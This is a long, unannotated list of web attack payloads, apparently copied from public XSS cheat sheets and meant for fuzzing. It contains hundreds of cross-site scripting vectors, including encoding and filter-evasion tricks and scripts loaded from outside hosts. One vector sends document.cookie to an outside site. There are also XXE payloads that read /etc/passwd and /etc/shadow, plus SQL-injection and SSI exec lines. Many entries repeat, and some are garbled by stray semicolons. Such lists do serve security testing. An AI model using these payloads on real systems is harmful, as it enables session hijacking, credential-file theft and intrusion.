<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<a href="javascript#document.vulnerable=true;">
<div onmouseover="document.vulnerable=true;">
<img src="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.vulnerable=true;">
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<bgsound src="javascript:document.vulnerable=true;">
&<script>document.vulnerable=true;</script>
&{document.vulnerable=true;};
<img src=&{document.vulnerable=true;};>
<link rel="stylesheet" href="javascript:document.vulnerable=true;">
<iframe src="vbscript:document.vulnerable=true;">
<img src="mocha:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<a href="about:<script>document.vulnerable=true;</script>">
<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
<body onload="document.vulnerable=true;">
<div style="background-image: url(javascript:document.vulnerable=true;);">
<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
<div style="width: expression(document.vulnerable=true;);">
<style type="text/javascript">document.vulnerable=true;</style>
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<style><!--</style><script>document.vulnerable=true;//--></script>
<<script>document.vulnerable=true;</script>
<![<!--]]<script>document.vulnerable=true;//--></script>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
<img src="blah"onmouseover="document.vulnerable=true;">
<img src="blah>" onmouseover="document.vulnerable=true;">
<xml src="javascript:document.vulnerable=true;">
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div>
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<style>@import'http://www.securitycompass.com/xss.css';</style>
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
&lt;/br style=a:expression(alert())&gt;
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
';';;!--";<;XSS>;=&;{()}
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
<;BODY ONLOAD=alert(';XSS';)>;
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=javascript:alert(';XSS';)>;
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
<;IMG SRC=";livescript:[code]";>;
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<;IMG SRC=";mocha:[code]";>;
<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<;HTML xmlns:xss>;
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
<;HTML>;<;BODY>;
<;!--[if gte IE 4]>;           
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
<;? echo(';<;SCR)';;
<;BR SIZE=";&;{alert(';XSS';)}";>;
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
\";;alert(';XSS';);//
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js
<;SCRIPT SRC=//ha.ckers.org/.j>;
<;IMG SRC=";javascript:alert(';XSS';)";
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<;SCRIPT>;a=/XSS/
<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;A HREF=";//google";>;XSS<;/A>;
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
<script>document.vulnerable=true;</script>
<img SRC="jav ascript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
<script <B>document.vulnerable=true;</script>
<img SRC="javascript:document.vulnerable=true;"
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
\";document.vulnerable=true;;//
</title><SCRIPT>document.vulnerable=true;</script>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
<body BACKGROUND="javascript:document.vulnerable=true;">
<body ONLOAD=document.vulnerable=true;>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<bgsound SRC="javascript:document.vulnerable=true;">
<br SIZE="&{document.vulnerable=true}">
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img SRC='vbscript:document.vulnerable=true;'>
1script3document.vulnerable=true;1/script3
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<table BACKGROUND="javascript:document.vulnerable=true;">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<div STYLE="width: expression(document.vulnerable=true);">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
<base HREF="javascript:document.vulnerable=true;//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<a href="javascript#document.vulnerable=true;">
<div onmouseover="document.vulnerable=true;">
<img src="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.vulnerable=true;">
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<bgsound src="javascript:document.vulnerable=true;">
&<script>document.vulnerable=true;</script>
&{document.vulnerable=true;};
<img src=&{document.vulnerable=true;};>
<link rel="stylesheet" href="javascript:document.vulnerable=true;">
<iframe src="vbscript:document.vulnerable=true;">
<img src="mocha:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<a href="about:<script>document.vulnerable=true;</script>">
<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
<body onload="document.vulnerable=true;">
<div style="background-image: url(javascript:document.vulnerable=true;);">
<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
<div style="width: expression(document.vulnerable=true;);">
<style type="text/javascript">document.vulnerable=true;</style>
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<style><!--</style><script>document.vulnerable=true;//--></script>
<<script>document.vulnerable=true;</script>
<![<!--]]<script>document.vulnerable=true;//--></script>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
<img src="blah"onmouseover="document.vulnerable=true;">
<img src="blah>" onmouseover="document.vulnerable=true;">
<xml src="javascript:document.vulnerable=true;">
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div>
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<style>@import'http://www.securitycompass.com/xss.css';</style>
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;/script>;<;script>;alert(1)<;/script>;
<;/br style=a:expression(alert())>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<script>alert('XSS')</script>
%3cscript%3ealert('XSS')%3c/script%3e
%22%3e%3cscript%3ealert('XSS')%3c/script%3e
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert('XSS')>       
<img src=xss onerror=alert(1)>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
<<SCRIPT>alert("XSS");//<</SCRIPT>
%253cscript%253ealert(1)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<marquee onstart='javascript:alert('1');'>=(◕_◕)=
```
